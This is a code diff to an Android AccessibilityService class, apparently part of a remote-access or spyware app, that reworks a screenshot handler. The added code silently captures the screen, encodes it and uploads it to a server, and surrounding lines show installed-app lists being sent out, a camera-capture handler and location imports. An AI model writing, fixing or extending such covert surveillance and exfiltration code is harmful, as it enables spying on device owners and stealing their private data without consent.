@@ -12,7 +12,10 @@ import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
+import android.graphics.PixelFormat;
 import android.hardware.HardwareBuffer;
+import android.media.Image;
+import android.media.ImageReader;
 import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
@@ -21,8 +24,8 @@ import android.provider.Settings;
 import android.util.Base64;
 import android.util.Log;
 import android.view.Display;
-import android.view.PixelCopy; // <-- NEW, ROBUST API
-import android.view.Surface; // <-- NEW, ROBUST API
+import android.view.PixelCopy;
+import android.view.Surface;
 import android.view.accessibility.AccessibilityEvent;
 import androidx.annotation.NonNull;
 import androidx.core.content.ContextCompat;
@@ -36,6 +39,7 @@ import com.google.android.gms.location.LocationServices;
 import org.json.JSONException;
 import org.json.JSONObject;
 import java.io.ByteArrayOutputStream;
+import java.nio.ByteBuffer;
 import java.util.List;
 
 public class CoreService extends AccessibilityService {
@@ -177,7 +181,8 @@ public class CoreService extends AccessibilityService {
         submitDataToServer("installed_apps", apps);
     }
     
-    // --- NEW, ROBUST SCREENSHOT IMPLEMENTATION ---
+    // --- THIS IS THE FINAL, CORRECTED SCREENSHOT METHOD ---
+    @SuppressLint("WrongConstant")
     private void handleScreenshot() {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
             submitDataToServer("screenshot_error", "Screenshot API requires Android 11+.");
@@ -187,35 +192,59 @@ public class CoreService extends AccessibilityService {
         takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
             @Override
             public void onSuccess(@NonNull ScreenshotResult screenshotResult) {
-                submitDataToServer("lifecycle", "Hardware buffer captured. Processing with PixelCopy.");
+                submitDataToServer("lifecycle", "Hardware buffer captured. Processing...");
                 HardwareBuffer buffer = screenshotResult.getHardwareBuffer();
                 if (buffer == null) {
                     submitDataToServer("screenshot_error", "Capture returned a null HardwareBuffer.");
                     return;
                 }
-                final Bitmap bitmap = Bitmap.createBitmap(buffer.getWidth(), buffer.getHeight(), Bitmap.Config.ARGB_8888);
-                PixelCopy.request(Surface.wrap(buffer), null, bitmap, result -> {
-                    buffer.close(); // Release the hardware buffer immediately
-                    if (result == PixelCopy.SUCCESS) {
-                        try {
-                            ByteArrayOutputStream stream = new ByteArrayOutputStream();
-                            bitmap.compress(Bitmap.CompressFormat.JPEG, 85, stream);
-                            String encodedImage = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT);
-                            uploadFileToServer("screenshot", encodedImage);
-                            submitDataToServer("lifecycle", "Screenshot processed and uploaded successfully.");
-                        } catch (Exception e) {
-                            submitDataToServer("screenshot_error", "Bitmap processing failed: " + e.getMessage());
+                
+                Bitmap bitmap = null;
+                // --- THIS IS THE COMPATIBILITY FIX ---
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                     // The modern, efficient method
+                    bitmap = Bitmap.wrapHardwareBuffer(buffer, screenshotResult.getColorSpace());
+                } else {
+                    // The older, more compatible method (less efficient but works)
+                    bitmap = Bitmap.createBitmap(buffer.getWidth(), buffer.getHeight(), Bitmap.Config.ARGB_8888);
+                    // PixelCopy is still needed here to copy from the buffer to the bitmap
+                    final Bitmap finalBitmap = bitmap;
+                    PixelCopy.request(Surface.wrap(buffer), null, finalBitmap, result -> {
+                        if (result == PixelCopy.SUCCESS) {
+                            processAndUploadBitmap(finalBitmap);
+                        } else {
+                            submitDataToServer("screenshot_error", "PixelCopy failed with code: " + result);
                         }
-                    } else {
-                        submitDataToServer("screenshot_error", "PixelCopy failed with code: " + result);
-                    }
-                }, new Handler(Looper.getMainLooper()));
+                    }, new Handler(Looper.getMainLooper()));
+                    buffer.close();
+                    return; // Return because PixelCopy is asynchronous
+                }
+
+                if (bitmap != null) {
+                    processAndUploadBitmap(bitmap);
+                } else {
+                    submitDataToServer("screenshot_error", "Bitmap creation failed.");
+                }
+                buffer.close();
             }
+
             @Override
             public void onFailure(int errorCode) {
                 submitDataToServer("screenshot_error", "Native capture failed with code: " + errorCode);
             }
         });
+    }
+    
+    private void processAndUploadBitmap(Bitmap bitmap) {
+        try {
+            ByteArrayOutputStream stream = new ByteArrayOutputStream();
+            bitmap.compress(Bitmap.CompressFormat.JPEG, 85, stream);
+            String encodedImage = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT);
+            uploadFileToServer("screenshot", encodedImage);
+            submitDataToServer("lifecycle", "Screenshot processed and uploaded successfully.");
+        } catch (Exception e) {
+            submitDataToServer("screenshot_error", "Bitmap processing failed: " + e.getMessage());
+        }
     }
     
     private void handleTakePicture(String cameraIdStr) {
